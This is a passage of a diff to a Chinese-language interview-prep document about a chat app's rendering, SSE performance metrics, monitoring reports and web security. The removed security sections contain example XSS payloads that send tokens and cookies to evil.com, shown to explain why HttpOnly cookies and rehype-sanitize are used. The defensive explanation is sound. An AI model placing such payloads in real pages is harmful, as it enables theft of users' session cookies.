-| JS 体积     | 0 KB 发送到客户端                    | 完整 JS 发送到客户端             |
-| 渲染方式      | 服务端渲染为 HTML                    | 浏览器中渲染                   |
-
-**注意：** 当前实现中 Markdown 渲染实际上发生在 `SharePageClient.tsx`（客户端组件），使用了 `MarkdownRenderer`。RSC 主要负责的是**数据获取**（直接查数据库而不是调 API），减少了客户端 API 调用和数据序列化的开销。
-
-虽然 CLAUDE.md 中提到 "RSC renders markdown server-side"，但实际代码中 `SharePageClient` 里的 `MarkdownRenderer` 是在客户端执行的（它包含了 `useState` for copy button、rehypeHighlight 等需要浏览器环境的插件）。更准确的说法是：RSC 负责服务端数据直查，分享页的客户端 JS 体积很小（没有聊天功能、没有 SSE、没有状态管理），只有 Markdown 渲染和基本布局。
-
-**实际收益：**
-
-1. **无需客户端 API 调用**：分享页加载时不需要 fetch 数据，数据库查询在服务端完成
-2. **SEO 友好**：聊天的文本内容在服务端渲染为 HTML，搜索引擎可抓取
-3. **首屏快速**：HTML 直出，不需要等 JS 加载和 API 响应
-4. **客户端 JS 体积 \~5.6KB**（CLAUDE.md 数据），远低于聊天页的完整 bundle
-
-***
-
-### Q31：RSC 能不能用 useState？哪些 Hook 不能在 RSC 里用？怎么区分客户端组件和服务端组件？
-
-**回答：**
-
-**RSC 不能使用的 Hook：**
-
-| Hook                      | 能否在 RSC 中用           | 原因                                      |
-| ------------------------- | -------------------- | --------------------------------------- |
-| `useState`                | 否                    | RSC 运行在服务端，无状态概念，只渲染一次                  |
-| `useEffect`               | 否                    | 无浏览器生命周期                                |
-| `useRef`                  | 否                    | 无 DOM 引用                                |
-| `useContext`              | 否                    | RSC 不支持 React Context（但可用 `cache()` 替代） |
-| `useReducer`              | 否                    | 无状态管理                                   |
-| `useCallback` / `useMemo` | 否                    | RSC 只渲染一次，无需记忆化                         |
-| `useLayoutEffect`         | 否                    | 同 useEffect                             |
-| **任何自定义 Hook**            | **取决于内部是否用了上述 Hook** | 如果自定义 Hook 内部用了 `useState`，就不能在 RSC 中用  |
-
-**区分方式：**
-
-```typescript
-// Server Component（默认）
-// 文件顶部没有 "use client"
-export default async function MyServerComponent() {
-  const data = await db.query();  // ✅ 可以直接查数据库
-  return <div>{data}</div>;
-}
-
-// Client Component
-"use client";  // ← 这一行是关键
-import { useState } from 'react';
-
-export function MyClientComponent() {
-  const [count, setCount] = useState(0);  // ✅ 可以使用 Hook
-  return <button onClick={() => setCount(c => c + 1)}>{count}</button>;
-}
-```
-
-**RSC 可以用的：**
-
-- `async/await` 直接在组件函数中
-- 直接访问数据库、文件系统等 Node.js API
-- 导入并使用客户端组件（把客户端组件作为 children 渲染）
-- `cache()` 函数做数据去重
-
-**组合模式：**
-
-```
-RSC (page.tsx)                   ← 服务端执行：查数据库、序列化数据
-  └── Client Component (SharePageClient)  ← 浏览器执行：useState、事件处理、Markdown 渲染
-```
-
-***
-
-## SSE 性能监控
-
-### Q32：TTFB、TTLB、Stall 这三个指标分别怎么计算的？代码里是怎么采集的？
-
-**回答：**
-
-三个指标的定义和采集都在 `SSEPerformanceTracker` 类中（`lib/monitor/collector.ts`）：
-
-```typescript
-export class SSEPerformanceTracker {
-  private startTime = 0;        // 流开始时间
-  private firstByteTime = 0;    // 首字节到达时间
-  private lastChunkTime = 0;    // 上一个 chunk 到达时间
-  private chunkCount = 0;       // chunk 总数
-  private stallCount = 0;       // 卡顿次数
-  private totalStallDuration = 0; // 卡顿总时长
-
-  // 初始化
-  start() {
-    this.startTime = performance.now();  // 记录流开始时刻
-  }
-
-  // 每次收到 chunk 时调用
+class SSEPerformanceTracker {
   onChunk() {
     const now = performance.now();
-
-    if (this.chunkCount === 0) {
-      this.firstByteTime = now;  // 第一个 chunk → 记录首字节时间
-    }
-
-    // 卡顿检测：两个 chunk 之间的间隔 > 500ms
+    if (this.chunkCount === 0) this.firstByteTime = now;
     if (this.lastChunkTime > 0) {
       const gap = now - this.lastChunkTime;
-      if (gap > STALL_THRESHOLD) {   // STALL_THRESHOLD = 500
-        this.stallCount++;
-        this.totalStallDuration += gap;
-      }
+      if (gap > 500) { this.stallCount++; this.totalStallDuration += gap; }
     }
-
     this.lastChunkTime = now;
-    this.chunkCount++;
   }
-
-  // 流结束时计算上报
-  async finish(): Promise<SSEMetric | null> {
-    const now = performance.now();
-
-    const ttfb = this.firstByteTime - this.startTime;  // 首字节时间
-    const ttlb = now - this.startTime;                  // 流完成时间
-
-    // 构造 metric 对象，写入 IndexedDB
-    const metric: SSEMetric = {
-      id: this.metricId,
-      type: 'ttfb',
-      name: 'sse-ttfb',
-      value: ttfb,                       // 数值（毫秒）
-      timestamp: Date.now(),
-      chunkCount: this.chunkCount,
-      stallCount: this.stallCount,
-      stallDuration: this.totalStallDuration,
-      // ...
-    };
-    await addToQueue(metric);
-
-    // 同时上报 ttlb 和 stall（如有）...
+  finish() {
+    const ttfb = this.firstByteTime - this.startTime;
+    const ttlb = performance.now() - this.startTime;
   }
 }
 ```
 
-**指标含义：**
-
-```
-时间轴：
-
-│───── TTFB ─────│─────────── 流式传输 ──────────────────│
-│                 │                                        │
-startTime     firstByteTime                            finish()
-│                 │                                        │
-│                 │  chunk chunk chunk chunk ... chunk      │
-│                 │        ↑                                │
-│                 │    gap > 500ms = Stall                  │
-│                                                        │
-│─────────────────────────── TTLB ────────────────────────│
-```
-
-| 指标                           | 计算方式                            | 含义                                       | 健康标准         |
-| ---------------------------- | ------------------------------- | ---------------------------------------- | ------------ |
-| **TTFB**（Time To First Byte） | `firstByteTime - startTime`     | 从发送请求到收到第一个 SSE chunk 的时间，反映服务端处理速度和网络延迟 | < 200ms（良好）  |
-| **TTLB**（Time To Last Byte）  | `finishTime - startTime`        | 从发送请求到流完全结束的时间，反映整体响应速度                  | < 1000ms（良好） |
-| **Stall**（卡顿）                | `gap > 500ms`（两个相邻 chunk 的时间间隔） | 流式传输中出现超过 500ms 的中断，可能是模型推理卡顿或网络波动       | 卡顿率 < 1%（良好） |
-
-**为什么定义 500ms 为卡顿阈值：**
-
-正常流式输出的 chunk 间隔通常在 10-50ms。500ms 是显著的异常——大约相当于模型在 3-5 个 token 期间没有任何输出，对用户来说已经能感知到"卡了"。
-
-**采集时机（`ChatContainer.tsx`）：**
-
-```typescript
-const callbacks: StreamCallbacks = {
-  onTextStart: () => {
-    tracker.onPhaseChange('answering');
-  },
-  onTextDelta: (_id, delta) => {
-    buffer.push(delta);
-    tracker.onChunk();   // ← 每个 chunk 都记录
-  },
-  onToolInputStart: () => {
-    tracker.onPhaseChange('tool_calling');
-  },
-  onFinish: async () => {
-    // ...
-    tracker.finish();    // ← 流结束时上报所有指标
-  },
-};
-```
-
-***
-
-### Q33：页面卸载时数据上报可能丢失，sendBeacon 是怎么解决的？它和直接发 Fetch 请求有什么区别？
-
-**回答：**
-
-**数据丢失场景：**
-
-用户关闭标签页或导航离开时，还在 IndexedDB 队列中的监控数据需要上报。但如果用普通的 `fetch()` 请求：
-
-```typescript
-// ❌ 不可靠：浏览器可能在请求完成前终止页面
-window.addEventListener('beforeunload', () => {
-  fetch('/api/monitor', {
-    method: 'POST',
-    body: JSON.stringify(report),
-  });  // 这个请求大概率发不出去
-});
-```
-
-**`sendBeacon`** **的独特机制：**
-
-`navigator.sendBeacon(url, data)` 是专门为页面卸载场景设计的 API。它在浏览器内部排队，即使页面被销毁，浏览器也会在后台完成这个请求。**sendBeacon 的请求不绑定页面生命周期。**
-
-**双通道上报实现（`lib/monitor/reporter.ts`）：**
-
-```typescript
-const REPORT_URL = '/api/monitor';
-
-// 通道 1：sendBeacon（优先，用于页面卸载）
-export function sendWithBeacon(report: MetricReport): boolean {
-  const payload = JSON.stringify(report);
-  return navigator.sendBeacon(REPORT_URL, payload);
-}
-
-// 通道 2：Fetch（fallback，用于正常上报）
-export async function sendWithFetch(report: MetricReport): Promise<boolean> {
-  try {
-    const response = await fetch(REPORT_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(report),
-      keepalive: true,  // ← 即使页面关闭也尽量完成
-    });
-    return response.ok;
-  } catch {
-    return false;
-  }
-}
-
-// 上报策略：sendBeacon 优先，失败降级到 Fetch
-export async function sendReport(report: MetricReport): Promise<boolean> {
-  if (typeof navigator !== 'undefined' && typeof navigator.sendBeacon === 'function') {
-    const success = sendWithBeacon(report);
-    if (success) return true;
-  }
-  return sendWithFetch(report);
-}
-```
-
-**sendBeacon vs Fetch 对比：**
-
-| 维度           | sendBeacon                     | Fetch                         |
-| ------------ | ------------------------------ | ----------------------------- |
-| 执行时机         | 浏览器后台排队，不阻塞页面卸载                | 同步竞争页面生命周期                    |
-| 能否自定义 Header | **不能**（只能 `Content-Type` 的简单值） | 可以                            |
-| 能否获取响应       | **不能**（fire-and-forget）        | 可以读 response                  |
-| 数据大小限制       | \~64KB                         | 无硬性限制                         |
-| `keepalive`  | 天然支持                           | 需设置 `keepalive: true`，但仍有大小限制 |
-| 适用场景         | 页面卸载时的关键数据上报                   | 需要读取响应的正常请求                   |
-
-**三层上报保障：**
-
-1. **定时上报**（每 10 秒）：`setInterval(flushQueue, 10000)` → Fetch 批量发送
-2. **页面隐藏时上报**：`visibilitychange` → 标签页切到后台时立即上报
-3. **页面卸载时上报**：`beforeunload` → sendBeacon 保证不丢失
-
-```typescript
-// lib/monitor/collector.ts
-export function startAutoFlush(): { stop: () => void } {
-  // 1. 定时上报
-  const timer = setInterval(flushQueue, 10000);
-
-  // 2. 页面切后台时立即上报
-  const onVisibilityChange = () => {
-    if (document.visibilityState === 'hidden') {
-      flushQueue();
-    }
-  };
-
-  // 3. 页面卸载时上报
-  const onBeforeUnload = () => {
-    flushQueue();
-  };
-
-  document.addEventListener('visibilitychange', onVisibilityChange);
-  window.addEventListener('beforeunload', onBeforeUnload);
-
-  return {
-    stop: () => {
-      clearInterval(timer);
-      document.removeEventListener('visibilitychange', onVisibilityChange);
-      window.removeEventListener('beforeunload', onBeforeUnload);
-    },
-  };
-}
-```
-
-***
-
-### Q34：IndexedDB 离线队列怎么保证数据不丢？重新上线后怎么触发重传？会不会重复上报？
-
-**回答：**
-
-**IndexedDB 离线队列实现（`lib/monitor/indexeddb.ts`）：**
-
-```typescript
-const DB_NAME = 'sky-monitor';
-const DB_VERSION = 1;
-const STORE_NAME = 'metrics';
-
-// 打开数据库（单例缓存，避免重复 open）
-let dbCache: IDBDatabase | null = null;
-
-function openDB(): Promise<IDBDatabase> {
-  if (dbCache) return Promise.resolve(dbCache);
-
-  return new Promise((resolve, reject) => {
-    const request = indexedDB.open(DB_NAME, DB_VERSION);
-
-    request.onupgradeneeded = () => {
-      const db = request.result;
-      if (!db.objectStoreNames.contains(STORE_NAME)) {
-        const store = db.createObjectStore(STORE_NAME, { keyPath: 'id' });
-        store.createIndex('type', 'type', { unique: false });
-        store.createIndex('timestamp', 'timestamp', { unique: false });
-      }
-    };
-
-    request.onsuccess = () => {
-      dbCache = request.result;
-      // 数据库连接意外关闭时清除缓存
-      dbCache.onclose = () => { dbCache = null; };
-      dbCache.onversionchange = () => { dbCache?.close(); dbCache = null; };
-      resolve(dbCache);
-    };
-
-    request.onerror = () => reject(request.error);
-  });
-}
-```
-
-**数据写入（带静默降级）：**
-
-```typescript
-export async function addToQueue(metric: PerformanceMetric | SSEMetric): Promise<void> {
-  await withDB((db) => {
-    return new Promise<void>((resolve, reject) => {
-      const tx = db.transaction(STORE_NAME, 'readwrite');
-      const store = tx.objectStore(STORE_NAME);
-      store.add(metric);           // keyPath: 'id'，重复 ID 会失败
-      tx.oncomplete = () => resolve();
-      tx.onerror = () => reject(tx.error);
-    });
-  });
-}
-```
-
-**批量上报 + 逐条删除：**
-
-```typescript
-// 定时上报（每 10 秒）
-export async function flushQueue(): Promise<void> {
-  const queue = await getQueue();         // 读出所有待上报数据
-  if (queue.length === 0) return;
-
-  const batch = queue.slice(0, MAX_BATCH_SIZE);  // 每次最多 20 条
-
-  const report = {
-    metrics: batch,
-    url: window.location.href,
-    userAgent: navigator.userAgent,
-    timestamp: Date.now(),
-  };
-
-  const success = await sendReport(report);  // sendBeacon / Fetch
-
-  if (success) {
-    // 上报成功 → 从 IndexedDB 中删除这些记录
-    await clearQueue(batch.map((m) => m.id));
-  }
-  // 上报失败 → 保留在 IndexedDB 中，下次 flushQueue 重试
-}
-
-export async function clearQueue(ids: string[]): Promise<void> {
-  await withDB((db) => {
-    return new Promise<void>((resolve, reject) => {
-      const tx = db.transaction(STORE_NAME, 'readwrite');
-      const store = tx.objectStore(STORE_NAME);
-      for (const id of ids) store.delete(id);
-      tx.oncomplete = () => resolve();
-      tx.onerror = () => reject(tx.error);
-    });
-  });
-}
-```
-
-**数据不丢的策略链：**
-
-```
-生成监控数据
-  → addToQueue() 写入 IndexedDB          ← 持久化（即使页面刷新数据也在）
-    → flushQueue() 每 10 秒触发一次      ← 定时器，失败也不删除
-      → sendReport() → sendBeacon/Fetch  ← 双通道
-        → 成功 → clearQueue(ids)         ← 只有确认送达才删除
-        → 失败 → 保留，下次重试          ← 不会丢
-```
-
-**关于重新上线和重传：**
-
-- 不需要"重新上线"概念——IndexedDB 在浏览器本地，离线时数据照常写入队列
-- `flushQueue()` 的定时器一直在运行，网络恢复后下一次 `setInterval` 触发时会自动重试
-- 不需要监听 online/offline 事件，因为上报失败不删除数据，定时器自带重试
-
-**关于重复上报：**
-
-理论上不会重复上报，因为：
-
-1. 每条数据有唯一 `id`（`${metricId}-ttlb` 等），IndexedDB 使用 `keyPath: 'id'`，重复 ID 写入会失败
-2. 上报成功后立即删除，不会再次出现在队列中
-3. 如果上报请求成功但删除 IndexedDB 时浏览器崩溃 → 极小概率重复。服务端可通过 `metric.id` 去重
-
-这是一个"至少一次送达"（at-least-once）的模型，对于监控指标来说完全可以接受。
-
-***
-
-### Q35：P50/P90/P99 百分位统计是什么意思？为什么不用平均值？
-
-**回答：**
-
-**百分位定义：**
-
-- **P50（中位数）**：50% 的请求延迟 ≤ 此值
-- **P90**：90% 的请求延迟 ≤ 此值
-- **P99**：99% 的请求延迟 ≤ 此值
-
-**代码实现（`AdminPageClient.tsx`）：**
-
-```typescript
-function percentile(sorted: number[], p: number): number {
-  if (sorted.length === 0) return 0;
-  const idx = Math.floor(sorted.length * p);
-  return Math.round(sorted[Math.min(idx, sorted.length - 1)]);
-}
-
-// 使用
-const sortedTtfb = allTtfb.map((m) => m.value).sort((a, b) => a - b);
-const ttfbP50 = percentile(sortedTtfb, 0.5);
-const ttfbP90 = percentile(sortedTtfb, 0.9);
-const ttfbP99 = percentile(sortedTtfb, 0.99);
-```
-
-**为什么不用平均值：**
-
-```
-假设 100 次请求的 TTFB 数据：
-99 次：100ms
-1 次：30,000ms（某次冷启动或网络抖动）
-
-平均值 = (99 × 100 + 30,000) / 100 = 399ms
-P50    = 100ms
-P90    = 100ms
-P99    = 100ms
-
-→ 平均值 399ms 严重高估了"正常用户体验"，实际 99% 的用户只等了 100ms
-```
-
-**平均值对长尾异常极度敏感。** 一个极端值就能把平均值拉高数倍。而 P50/P90/P99 分别告诉你的信息是：
-
-| 指标  | 告诉你的信息                        |
-| --- | ----------------------------- |
-| P50 | "典型用户"感受到的延迟                  |
-| P90 | "比较倒霉的 10% 用户"感受到的延迟          |
-| P99 | "最倒霉的 1% 用户"感受到的延迟，是否存在严重长尾问题 |
-| 平均值 | 一个无法对应任何实际用户的数字               |
-
-**工程意义：**
-
-- 如果只优化 P50，P99 很差 → 大部分用户满意，但少数用户遭遇严重卡顿（"体验悬崖"）
-- 如果 P99 很好 → 说明系统在所有条件下都稳定
-- 本项目中，后台展示 P50/P90/P99 三列数值，配合健康评分（good/warning/critical）分级，可以快速判断流式传输的整体质量
-
-***
-
-## 安全
-
-### Q36：JWT 为什么要放 HttpOnly Cookie 里？不放的话有什么风险？
-
-**回答：**
-
-**JWT 的三种存储方式对比：**
-
-| 存储位置                | XSS 风险 | CSRF 风险 | JS 可读写 | 自动发送 |
-| ------------------- | ------ | ------- | ------ | ---- |
-| `localStorage`      | **高**  | 低       | 是      | 否    |
-| `sessionStorage`    | **高**  | 低       | 是      | 否    |
-| 内存变量（JS 闭包）         | 低      | 低       | 否      | 否    |
-| **HttpOnly Cookie** | **无**  | 中等      | 否      | 是    |
-
-**不放 HttpOnly Cookie 的风险：**
-
-```javascript
-// ❌ 存在 localStorage 中
-localStorage.setItem('token', jwt);
+---
 
-// 任何注入的 XSS 脚本都能读取
-const token = localStorage.getItem('token');
-fetch('https://evil.com/steal?token=' + token);  // 被盗走
-```
+### Q33：sendBeacon 怎么解决页面卸载时数据丢失？
 
-**HttpOnly Cookie 的三重保护：**
+**S（背景）**：监控数据在 IndexedDB 队列中，每 10 秒上报一次。但用户可能在任何时刻关闭标签页——定时器最后几秒的数据会丢失。
 
-```typescript
-// lib/auth.ts
-export function setAuthCookie(token: string) {
-  return {
-    name: 'sky-chat-token',
-    value: token,
-    httpOnly: true,        // ← 1. JS 完全无法访问（document.cookie 读不到）
-    secure: process.env.NODE_ENV === 'production', // ← 2. 仅 HTTPS 传输
-    sameSite: 'lax',       // ← 3. 防止跨站请求伪造（CSRF）
-    maxAge: 60 * 60 * 24 * 7,  // 7 天过期
-    path: '/',
-  };
-}
-```
+**T（任务）**：保证页面卸载时队列中的数据能被成功发送。
 
-- **`httpOnly: true`**：`document.cookie` 读不到，XSS 注入的恶意脚本无法窃取 token
-- **`secure: true`**（生产环境）：Cookie 只在 HTTPS 连接中传输，防止中间人攻击
-- **`sameSite: 'lax'`**：跨站请求不携带此 Cookie，防止 CSRF 攻击
+**A（方案）**：普通 fetch 请求绑定页面生命周期——页面卸载后浏览器可能直接杀掉进程，请求发不出去。sendBeacon 是专门为这个场景设计的——浏览器内部排队处理，即使页面销毁也在后台完成，不绑定页面生命周期。我设计了双通道上报：优先 sendBeacon（发完就走，但不能自定义 Header、拿不到响应），失败降级到 Fetch + keepalive。三层触发保证不漏：每 10 秒定时器、visibilitychange 切后台、beforeunload 卸载时。
 
-**如果放在 localStorage 中遭受 XSS 攻击的后果：**
+**R（结果）**：正常退出、切后台、关闭标签页三种场景全覆盖。上线后未发现数据丢失。
 
-攻击者注入的脚本可以：
+---
 
-1. 读取 `localStorage.getItem('token')` → 发送到攻击者服务器
-2. 直接以受害者身份调用 `/api/chat` → 盗用 AI 额度
-3. 读取聊天记录 → 信息泄露
-4. 修改页面内容 → 钓鱼
+### Q34：IndexedDB 离线队列怎么保证不丢？会不会重复上报？
 
-HttpOnly Cookie 模式下，即使 XSS 注入成功，攻击者只能"使用" Cookie（通过 fetch 时浏览器自动携带），但无法"窃取" Cookie 本身的值。攻击者在当前页面内操作的窗口有限（页面关闭即失效），无法将 token 持久化到外部。
+**S（背景）**：监控数据需要持久化存储——内存变量页面刷新就没了。
 
-***
+**T（任务）**：用 IndexedDB 实现离线队列，保证数据不丢。
 
-### Q37：XSS 攻击有哪几种类型？你做的 rehype-sanitize 防的是哪种？
+**A（方案）**：核心策略是上报成功才删除。每 10 秒取所有数据，一批最多 20 条。sendBeacon/Fetch 发送 → 成功就逐条删除，失败就保留下次重试。不需要监听 online/offline 事件——定时器一直在跑，网络恢复自动重试。页面刷新数据在 IndexedDB 里不会丢。重复上报基本不会——每条有唯一 ID，上报完立即删除。极端情况（上报成但删除前崩溃）极小概率，服务端可按 metric.id 去重。这是"至少一次送达"模型，对监控指标可以接受。
 
-**回答：**
+**R（结果）**：网络断开、刷新、标签页关闭都测过，数据不丢。
 
-**XSS 三种类型：**
+---
 
-| 类型                     | 攻击方式                         | 示例                                           |
-| ---------------------- | ---------------------------- | -------------------------------------------- |
-| **存储型 XSS（Stored）**    | 恶意代码存储在服务端（数据库），其他用户访问时触发    | 评论中写入 `<script>...</script>`，其他用户浏览评论时执行     |
-| **反射型 XSS（Reflected）** | 恶意代码在 URL 参数中，服务端直接回显        | `?q=<script>alert(1)</script>`，搜索结果页直接渲染这个参数 |
-| **DOM 型 XSS**          | 纯客户端问题，JS 将不可信数据写入 innerHTML | `div.innerHTML = location.hash`              |
+### Q35：P50/P90/P99 是什么意思？为什么不用平均值？
 
-**本项目中的风险场景（存储型 XSS）：**
+**S（背景）**：管理后台需要展示流式延时的统计数据。
 
-AI 模型返回的 Markdown 内容经过 `react-markdown` 渲染为 HTML。如果 AI 被诱导输出了恶意 HTML：
+**T（任务）**：选择合适的统计方法，能真实反映用户体验。
 
-```markdown
-这是一段看似无害的文字 <script>fetch('https://evil.com?c='+document.cookie)</script>
-或者：
-[点击领取奖励](javascript:alert(document.cookie))
-```
+**A（方案）**：P50 是中位数——50% 请求延迟 ≤ 此值。P90 是 90% 请求 ≤ 此值。P99 是 99% 请求 ≤ 此值。不用平均值是因为它对极端值极度敏感——99 次 100ms、1 次 30000ms，平均值 399ms，但 99% 用户只等了 100ms。平均值不反映任何实际用户。P50 反映典型用户，P90 反映比较倒霉的 10%，P99 反映极端尾部的 1%。
 
-任何浏览该聊天记录或分享页面的用户都会中招——这属于**存储型 XSS**（聊天记录存储在数据库中）。
+**R（结果）**：管理后台展示 TTFB 和 TTLB 的 P50/P90/P99 三列，配合健康评分机制能快速判断流式传输的整体质量。
 
-**rehype-sanitize 的防护（白名单过滤）：**
+---
 
-```typescript
-// MarkdownRenderer.tsx
-import rehypeSanitize from 'rehype-sanitize';
+## 六、安全
 
-<ReactMarkdown
-  remarkPlugins={[remarkGfm]}
-  rehypePlugins={[rehypeSanitize, rehypeHighlight]}  // ← sanitize 在 highlight 之前
-  ...
->
-  {displayContent}
-</ReactMarkdown>
-```
+### Q36：JWT 为什么要放 HttpOnly Cookie？
 
-`rehype-sanitize` 基于 GitHub 的 `hast-util-sanitize`，使用白名单机制：
+**S（背景）**：JWT token 需要在客户端存储，可选的方案有 localStorage、sessionStorage、内存、Cookie。
 
-- 只允许安全的 HTML 标签通过（如 `<p>`、`<strong>`、`<code>`、`<a>` 等）
-- 过滤 `<script>`、`<iframe>`、`<object>` 等危险标签
-- 过滤 `onclick`、`onerror` 等事件处理器属性
-- 过滤 `javascript:` 协议的 URL
+**T（任务）**：选择最安全的存储方式，防止 token 泄露。
 
-这是防所有类型的 XSS（因为 AI 输出的 HTML 最终都要渲染在 DOM 中），主要防护的是 **存储型 XSS**，因为攻击 payload 会随聊天记录持久化到数据库。
+**A（方案）**：HttpOnly Cookie 最大的特点是 JS 完全读不到——document.cookie 拿不到。如果放 localStorage，任何 XSS 注入的恶意脚本都能窃取 token。HttpOnly 模式下即使 XSS 成功，攻击者只能"使用"（浏览器自动携带），不能"窃取"持久化。另外我还加了 secure（生产环境仅 HTTPS）和 sameSite:'lax'（防 CSRF 跨站攻击）。
 
-***
+**R（结果）**：三层 Cookie 属性（httpOnly + secure + sameSite）同时防护 XSS、中间人、CSRF 三种攻击。
 
-### Q38：rehype-sanitize 的白名单机制是什么？你配置了哪些允许的标签？如果不配置会怎样？
+---
 
-**回答：**
+### Q37：XSS 有哪几种类型？你做的 rehype-sanitize 防哪种？
 
-**白名单原理：**
+**S（背景）**：AI 可能被诱导输出恶意 HTML，内容存入数据库后任何浏览聊天记录的用户都可能被攻击。
 
-rehype-sanitize 的默认策略是 **只放行已知安全的标签和属性，其余一律删除**。这就是"白名单"——只列出"允许的"，而不是列出"禁止的"（黑名单的致命缺陷：永远列不完）。
+**T（任务）**：防止 AI 输出的恶意 HTML 在用户浏览器中执行。
 
-**本项目使用的默认配置（GitHub 风格安全标签集）：**
+**A（方案）**：XSS 分三种——存储型（恶意数据存数据库）、反射型（恶意代码在 URL 参数回显）、DOM 型（纯客户端 JS 写入不可信数据）。这个项目主要防存储型，因为 AI 回复存在数据库里。用 rehype-sanitize 插件，在 react-markdown 渲染时做白名单过滤：允许 p、code、a 等安全标签，删除 script、iframe、form 等危险标签，删除所有 on* 事件属性，过滤 javascript: 协议。
 
-rehype-sanitize 默认使用的是 `hast-util-sanitize` 的 GitHub 兼容 schema。我并没有自定义配置，而是使用了它的默认值，涵盖了 Markdown 渲染所需的全部标签：
+**R（结果）**：危险内容在到达 DOM 前就被拦截，用户浏览任何聊天记录都不会执行恶意脚本。
 
-**允许的标签（默认白名单）：**
+---
 
-| 类别    | 标签                                                   |
-| ----- | ---------------------------------------------------- |
-| 标题    | `h1`, `h2`, `h3`, `h4`, `h5`, `h6`                   |
-| 文本结构  | `p`, `div`, `span`, `br`, `hr`                       |
-| 列表    | `ul`, `ol`, `li`                                     |
-| 文本格式  | `strong`, `em`, `b`, `i`, `s`, `del`, `sup`, `sub`   |
-| 表格    | `table`, `thead`, `tbody`, `tfoot`, `tr`, `th`, `td` |
-| 代码    | `code`, `pre`                                        |
-| 链接/图片 | `a`, `img`                                           |
-| 引用    | `blockquote`                                         |
-| 描述    | `dl`, `dt`, `dd`                                     |
+### Q38：rehype-sanitize 白名单机制是什么？
 
-**不允许的标签（部分会被移除）：**
+**S（背景）**：需要了理 sanitiize 的工作原理和配置方式。
 
-`<script>`、`<iframe>`、`<object>`、`<embed>`、`<form>`、`<input>`、`<button>`、`<style>`、`<link>`、`<meta>`、`<base>` 等
+**T（任务）**：用白名单过滤 AI 输出内容，只放行安全的 HTML 元素。
 
-**属性过滤：**
+**A（方案）**：白名单就是只放行已知安全的标签和属性，其余全删。黑名单的问题是永远列不完新攻击向量。默认白名单涵盖了 Markdown 需要的所有标签——标题 h1-h6、段落 p、列表 ul/ol/li、表格、代码 pre/code、链接 a、图片 img、引用等。删除的包括 script、iframe、object、embed、form、input、style 等。属性层面：href 只允许 http/https/mailto，javascrip: 被清空，所有 on* 事件属性全删。sanitize 插件放在 rehypeHighlight 之前——先过滤危险内容，再做语法高亮。
 
-- `href` 只允许 `http:`、`https:`、`mailto:` 等安全协议，不允许 `javascript:`
-- `src` 只允许 `http:`、`https:` 协议
-- 所有 `on*` 事件属性（`onclick`、`onerror`、`onload` 等）一律删除
-
-**如果不配置会怎样：**
-
-```markdown
-# 攻击示例（用户对 AI 说：请把我下面这段话翻译成英文）
-```
-
-AI 输出了：
-
-```html
-<script>fetch('https://evil.com/steal', {method:'POST', body:document.cookie})</script>
-```
-
-不配置 sanitize：
-
-- `<script>` 标签在 ReactMarkdown 渲染时被插入 DOM → 脚本执行 → Cookie 被盗
-- `javascript:` 链接可点击 → 用户点击后执行恶意代码
-
-配置 sanitize 后：
-
-- `<script>` 标签被整体移除，内容不渲染
-- `javascript:` 链接的 `href` 被清空，变成不可点击的纯文本
-
-**配置代码：**
-
-```typescript
-// 如果不用默认配置，可以自定义白名单：
-import rehypeSanitize, { defaultSchema } from 'rehype-sanitize';
-
-// 在默认基础上扩展：
-const mySchema = {
-  ...defaultSchema,
-  attributes: {
-    ...defaultSchema.attributes,
-    // 例如：额外允许 code 标签的 className（语法高亮需要）
-    code: [...(defaultSchema.attributes?.code || []), 'className'],
-  },
-};
-
-// 但本项目直接使用默认配置，因为默认已经涵盖了 Markdown 渲染的需求
-<ReactMarkdown rehypePlugins={[rehypeSanitize, rehypeHighlight]}>
-```
-
-**一个重要细节：** rehype-sanitize 在 rehypeHighlight 之前执行。确保先过滤危险内容，再对安全的代码块做语法高亮。
+**R（结果）**：使用默认 GitHub 兼容 schema 即可满足需求，不需要自定义白名单。
